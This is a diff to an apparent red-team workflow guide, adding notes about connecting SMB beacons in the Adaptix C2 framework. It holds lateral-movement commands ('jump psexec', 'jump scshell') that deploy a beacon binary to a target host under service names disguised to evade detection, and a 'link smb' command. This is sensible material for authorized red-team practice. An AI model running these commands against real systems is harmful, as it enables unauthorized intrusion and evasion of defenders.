@@ -1028,6 +1028,8 @@ Create custom service name and binary name to reduce signature:
 jump psexec -b svcutil.exe -n "WinConfigSvc" -d "Manages system configuration updates" 10.1.10.11 /local/path/to/smb_x64_svc.exe
 ```
 
+> The SMB beacon would have been the best and realistic option for this, however Kharon Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
+
 ![](image/red-team-workflow/20260922165526.png)
 
 ![](image/red-team-workflow/20260922165516.png)
@@ -1109,6 +1111,8 @@ With a specific service name and custom binary name:
 ```
 jump scshell 10.1.10.11 /local/path/to/smb_x64_svc.exe -n defragsvc -b update.exe -s C$ -p C:\Windows
 ```
+
+> The SMB beacon would have been the best and realistic option for this, however Kharon Listener config doesn't yet support SMB as previously explained in section 5.2. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
 
 ![](image/red-team-workflow/20260922165815.png)
 
